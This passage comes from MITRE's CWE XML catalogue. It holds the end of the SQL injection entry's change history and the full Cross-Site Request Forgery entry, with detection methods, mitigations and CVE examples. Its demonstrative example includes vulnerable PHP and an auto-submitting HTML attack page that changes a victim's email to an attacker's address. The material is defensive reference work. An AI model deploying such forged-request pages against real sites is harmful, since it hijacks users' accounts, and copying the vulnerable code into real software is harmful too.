            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Name,
						Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier>KDM Analytics</Modifier>
               <Modification_Date>2009-07-17</Modification_Date>
               <Modification_Comment>Improved the White_Box_Definition</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description, Name,
						White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors,
						Potential_Mitigations, References, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples,
						Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples,
						Description, Detection_Factors, Name, Potential_Mitigations, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References,
						Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2008-04-11">SQL
						Injection</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2008-09-09">Failure to Sanitize Data into
						SQL Queries (aka 'SQL Injection')</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2009-01-12">Failure to Sanitize Data
						within SQL Queries (aka 'SQL Injection')</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2009-05-27">Failure to Preserve SQL Query
						Structure (aka 'SQL Injection')</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2009-07-27">Failure to Preserve SQL Query
						Structure ('SQL Injection')</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2010-06-21">Improper Sanitization of
						Special Elements used in an SQL Command ('SQL
						Injection')</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness></Weaknesses><Compound_Elements xmlns:capec="http://capec.mitre.org/capec-2">
                    <Compound_Element ID="352" Name="Cross-Site Request Forgery (CSRF)" Compound_Element_Abstraction="Variant" Compound_Element_Structure="Composite" Status="Draft">
         <Description>
            <Description_Summary>The web application does not, or can not, sufficiently verify
					whether a well-formed, valid, consistent request was intentionally provided by
					the user who submitted the request.</Description_Summary>
            <Extended_Description>
               <Text>When a web server is designed to receive a request from a client without
						any mechanism for verifying that it was intentionally sent, then it might be
						possible for an attacker to trick a client into making an unintentional
						request to the web server which will be treated as an authentic request.
						This can be done via a URL, image load, XMLHttpRequest, etc. and can result
						in exposure of data or unintended code execution.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>864</Relationship_Target_ID>
               <!--2011 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>801</Relationship_Target_ID>
               <!--2010 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1003</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>345</Relationship_Target_ID>
               <!--Insufficient Verification of Data Authenticity--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>Requires</Relationship_Nature>
               <Relationship_Target_ID>346</Relationship_Target_ID>
               <!--Origin Validation Error--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>Requires</Relationship_Nature>
               <Relationship_Target_ID>441</Relationship_Target_ID>
               <!--Unintended Proxy or Intermediary ('Confused Deputy')--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>Requires</Relationship_Nature>
               <Relationship_Target_ID>642</Relationship_Target_ID>
               <!--External Control of Critical State Data--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>Requires</Relationship_Nature>
               <Relationship_Target_ID>613</Relationship_Target_ID>
               <!--Insufficient Session Expiration--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>442</Relationship_Target_ID>
               <!--Web Problems--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">629</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>716</Relationship_Target_ID>
               <!--OWASP Top Ten 2007 Category A5 - Cross Site Request Forgery (CSRF)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">750</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>751</Relationship_Target_ID>
               <!--2009 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>814</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A5 - Cross-Site Request Forgery(CSRF)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">928</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>936</Relationship_Target_ID>
               <!--OWASP Top Ten 2013 Category A8 - Cross-Site Request Forgery (CSRF)--></Relationship>
         </Relationships>
         <Relationship_Notes>
            <Relationship_Note>
               <Text>This can be resultant from XSS, although XSS is not necessarily
						required.</Text>
            </Relationship_Note>
         </Relationship_Notes>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
            <Technology_Classes>
               <Technology_Class Technology_Name="Web-Server"/>
            </Technology_Classes>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Session Riding</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Cross Site Reference Forgery</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>XSRF</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Medium to High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Scope>Non-Repudiation</Consequence_Scope>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Technical_Impact>Gain privileges / assume
						identity</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Bypass protection
						mechanism</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Read application
						data</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Modify application
						data</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>DoS: crash / exit /
						restart</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text> The consequences will vary depending on the nature of the
							functionality that is vulnerable to CSRF. An attacker could effectively
							perform any operations as the victim. If the victim is an administrator
							or privileged user, the consequences may include obtaining complete
							control over the web application - deleting or stealing data,
							uninstalling the product, or using it to launch other attacks against
							all of the product's users. Because the attacker has the identity of the
							victim, the scope of CSRF is limited only by the victim's privileges.
						</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-7">
               <Method_Name>Manual Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using tools and techniques that require
							manual (human) analysis, such as penetration testing, threat modeling,
							and interactive tools that allow the tester to record and modify an
							active session. </Text>
                  <Text>Specifically, manual analysis can be useful for finding this weakness,
							and for minimizing false positives assuming an understanding of business
							logic. However, it might not achieve desired code coverage within
							limited time constraints. For black-box analysis, if credentials are not
							known for privileged accounts, then the most security-critical portions
							of the application may not receive sufficient attention.</Text>
                  <Text>Consider using OWASP CSRFTester to identify potential issues and aid
							in manual analysis.</Text>
               </Method_Description>
               <Method_Effectiveness>High</Method_Effectiveness>
               <Method_Effectiveness_Notes>
                  <Text> These may be more effective than strictly automated techniques. This
							is especially the case with weaknesses that are related to design and
							business rules.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>CSRF is currently difficult to detect reliably using automated
							techniques. This is because each application has its own implicit
							security policy that dictates which requests can be influenced by an
							outsider and automatically performed on behalf of a user, versus which
							requests require strong confidence that the user intends to make the
							request. For example, a keyword search of the public portion of a web
							site is typically expected to be encoded within a link that can be
							launched automatically when the user clicks on the link.</Text>
               </Method_Description>
               <Method_Effectiveness>Limited</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Bytecode Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                        <Text>Binary Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode disassembler - then use manual analysis for
									vulnerabilities &amp; anomalies</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with automated results
						interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Web Application Scanner</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Fuzz Tester</Text>
                        <Text>Framework-based Fuzzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to
							avoid.</Text>
                  <Text>For example, use anti-CSRF packages such as the OWASP CSRFGuard.
							[R.352.3]</Text>
                  <Text>Another example is the ESAPI Session Management control, which
							includes a component for CSRF. [R.352.9]</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Ensure that the application is free of cross-site scripting issues
							(CWE-79), because most CSRF defenses can be bypassed using
							attacker-controlled script.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Generate a unique nonce for each form, place the nonce into the form,
							and verify the nonce upon receipt of the form. Be sure that the nonce is
							not predictable (CWE-330). [R.352.5]</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness_Notes>
                  <Text>Note that this can be bypassed using XSS (CWE-79).</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Identify especially dangerous operations. When the user performs a
							dangerous operation, send a separate confirmation request to ensure that
							the user intended to perform that operation.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness_Notes>
                  <Text>Note that this can be bypassed using XSS (CWE-79).</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Use the "double-submitted cookie" method as described by Felten and
							Zeller:</Text>
                  <Text>When a user visits a site, the site should generate a pseudorandom
							value and set it as a cookie on the user's machine. The site should
							require every form submission to include this value as a form value and
							also as a cookie value. When a POST request is sent to the site, the
							request should only be considered valid if the form value and the cookie
							value are the same.</Text>
                  <Text>Because of the same-origin policy, an attacker cannot read or modify
							the value stored in the cookie. To successfully submit a form on behalf
							of the user, the attacker would have to correctly guess the pseudorandom
							value. If the pseudorandom value is cryptographically strong, this will
							be prohibitively difficult.</Text>
                  <Text>This technique requires Javascript, so it may not work for browsers
							that have Javascript disabled. [R.352.4]</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness_Notes>
                  <Text>Note that this can probably be bypassed using XSS (CWE-79), or when
							using web technologies that enable the attacker to read raw headers from
							HTTP requests.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Do not use the GET method for any request that triggers a state
							change.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Check the HTTP Referer header to see if the request originated from an
							expected page. This could break legitimate functionality, because users
							or proxies may have disabled sending the Referer for privacy
							reasons.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness_Notes>
                  <Text>Note that this can be bypassed using XSS (CWE-79). An attacker could
							use XSS to generate a spoofed Referer, or to generate a malicious
							request from a page whose Referer would be allowed.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This example PHP code attempts to secure the form submission process
						by validating that the user submitting the form has a valid session. A CSRF
						attack would not be prevented by this countermeasure because the attacker
						forges a request through the user's web browser in which a valid session
						already exists.</Intro_Text>
               <Example_Body>
                  <Text>The following HTML is intended to allow a user to update a
							profile.</Text>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>HTML</Code_Example_Language>
                     <Code>&lt;form action="/url/profile.php"
								method="post"&gt;</Code>
                     <Code>&lt;input type="text" name="firstname"/&gt;</Code>
                     <Code>&lt;input type="text" name="lastname"/&gt;</Code>
                     <Code>&lt;br/&gt;</Code>
                     <Code>&lt;input type="text" name="email"/&gt;</Code>
                     <Code>&lt;input type="submit" name="submit"
								value="Update"/&gt;</Code>
                     <Code>&lt;/form&gt;</Code>
                  </Block>
                  <Text>profile.php contains the following code.</Text>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code>// initiate the session in order to validate sessions</Code>
                     <Code/>
                     <Code>session_start();</Code>
                     <Code/>
                     <Comment>//if the session is registered to a valid user then allow
								update</Comment>
                     <Code/>
                     <Code>if (! session_is_registered("username")) {</Code>
                     <Block>
                        <Code/>
                        <Code> echo "invalid session detected!";</Code>
                        <Code/>
                        <Comment>// Redirect user to login page</Comment>
                        <Code> [...]</Code>
                        <Code/>
                        <Code> exit;</Code>
                     </Block>
                     <Code>}</Code>
                     <Code/>
                     <Comment>// The user session is valid, so process the request</Comment>
                     <Comment>// and update the information</Comment>
                     <Code/>
                     <Code>update_profile();</Code>
                     <Code/>
                     <Code>function update_profile {</Code>
                     <Block>
                        <Comment>// read in the data from $POST and send an update</Comment>
                        <Comment>// to the database</Comment>
                        <Code>SendUpdateToDatabase($_SESSION['username'],
									$_POST['email']);</Code>
                        <Code> [...]</Code>
                        <Code>echo "Your profile has been successfully updated.";</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>This code may look protected since it checks for a valid session.
							However, CSRF attacks can be staged from virtually any tag or HTML
							construct, including image tags, links, embed or object tags, or other
							attributes that load background images.</Text>
                  <Text>The attacker can then host code that will silently change the username
							and email address of any user that visits the page while remaining
							logged in to the target web application. The code might be an
							innocent-looking web page such as:</Text>
                  <Block Block_Nature="Attack">
                     <Code_Example_Language>HTML</Code_Example_Language>
                     <Code>&lt;SCRIPT&gt;</Code>
                     <Code>function SendAttack () {</Code>
                     <Block>
                        <Code>form.email = "attacker@example.com";</Code>
                        <Comment>// send to profile.php</Comment>
                        <Code>form.submit();</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>&lt;/SCRIPT&gt;</Code>
                     <Code/>
                     <Code>&lt;BODY onload="javascript:SendAttack();"&gt;</Code>
                     <Code/>
                     <Code>&lt;form action="http://victim.example.com/profile.php"
								id="form" method="post"&gt;</Code>
                     <Code>&lt;input type="hidden" name="firstname"
								value="Funny"&gt;</Code>
                     <Code>&lt;input type="hidden" name="lastname"
								value="Joke"&gt;</Code>
                     <Code>&lt;br/&gt;</Code>
                     <Code>&lt;input type="hidden" name="email"&gt;</Code>
                     <Code>&lt;/form&gt;</Code>
                  </Block>
                  <Text>Notice how the form contains hidden fields, so when it is loaded into
							the browser, the user will not notice it. Because SendAttack() is
							defined in the body's onload attribute, it will be automatically called
							when the victim loads the web page.</Text>
                  <Text>Assuming that the user is already logged in to victim.example.com,
							profile.php will see that a valid user session has been established,
							then update the email address to the attacker's own address. At this
							stage, the user's identity has been compromised, and messages sent
							through this profile could be sent to the attacker's address.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-1703</Observed_Example_Reference>
               <Observed_Example_Description>Add user accounts via a URL in an img
						tag</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-1995</Observed_Example_Reference>
               <Observed_Example_Description>Add user accounts via a URL in an img
						tag</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-1967</Observed_Example_Reference>
               <Observed_Example_Description>Arbitrary code execution by specifying the code in
						a crafted img tag or URL</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-1842</Observed_Example_Reference>
               <Observed_Example_Description>Gain administrative privileges via a URL in an img
						tag</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-1947</Observed_Example_Reference>
               <Observed_Example_Description>Delete a victim's information via a URL or an img
						tag</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-2059</Observed_Example_Reference>
               <Observed_Example_Description>Change another user's settings via a URL or an img
						tag</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-1674</Observed_Example_Reference>
               <Observed_Example_Description>Perform actions as administrator via a URL or an
						img tag</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3520</Observed_Example_Reference>
               <Observed_Example_Description> modify password for the
						administrator</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3022</Observed_Example_Reference>
               <Observed_Example_Description>CMS allows modification of configuration via CSRF
						attack against the administrator</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3759</Observed_Example_Reference>
               <Observed_Example_Description>web interface allows password changes or stopping
						a virtual machine via CSRF</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Theoretical_Notes>
            <Theoretical_Note>
               <Text>The CSRF topology is multi-channel:</Text>
               <Block>
                  <Text>1. Attacker (as outsider) to intermediary (as user). The interaction
							point is either an external or internal channel.</Text>
                  <Text>2. Intermediary (as user) to server (as victim). The activation point
							is an internal channel.</Text>
               </Block>
            </Theoretical_Note>
         </Theoretical_Notes>
         <Research_Gaps>
            <Research_Gap>
               <Text>This issue was under-reported in CVE until around 2008, when it began to
						gain prominence. It is likely to be present in most web applications.</Text>
            </Research_Gap>
         </Research_Gaps>
         <References>
            <Reference Reference_ID="REF-17" Local_Reference_ID="R.352.1">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 2: Web-Server Related Vulnerabilities (XSS, XSRF, and
						Response Splitting)." Page 37</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
            <Reference Local_Reference_ID="R.352.2">
               <Reference_Author>Peter W</Reference_Author>
               <Reference_Title>Cross-Site Request Forgeries (Re: The Dangers of Allowing Users
						to Post Images)</Reference_Title>
               <Reference_Publication>Bugtraq</Reference_Publication>
               <Reference_Link>http://marc.info/?l=bugtraq&amp;m=99263135911884&amp;w=2</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.352.3">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>Cross-Site Request Forgery (CSRF) Prevention Cheat
						Sheet</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.352.4">
               <Reference_Author>Edward W. Felten</Reference_Author>
               <Reference_Author>William Zeller</Reference_Author>
               <Reference_Title>Cross-Site Request Forgeries: Exploitation and
						Prevention</Reference_Title>
               <Reference_Date>2008-10-18</Reference_Date>
               <Reference_Link>http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.147.1445</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.352.5">
               <Reference_Author>Robert Auger</Reference_Author>
               <Reference_Title>CSRF - The Cross-Site Request Forgery (CSRF/XSRF)
						FAQ</Reference_Title>
               <Reference_Link>http://www.cgisecurity.com/articles/csrf-faq.shtml</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.352.6">
               <Reference_Title>Cross-site request forgery</Reference_Title>
               <Reference_Publisher>Wikipedia</Reference_Publisher>
               <Reference_Date>2008-12-22</Reference_Date>
               <Reference_Link>http://en.wikipedia.org/wiki/Cross-site_request_forgery</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.352.7">
               <Reference_Author>Jason Lam</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 4 - Cross Site Request
						Forgery</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-03</Reference_Date>
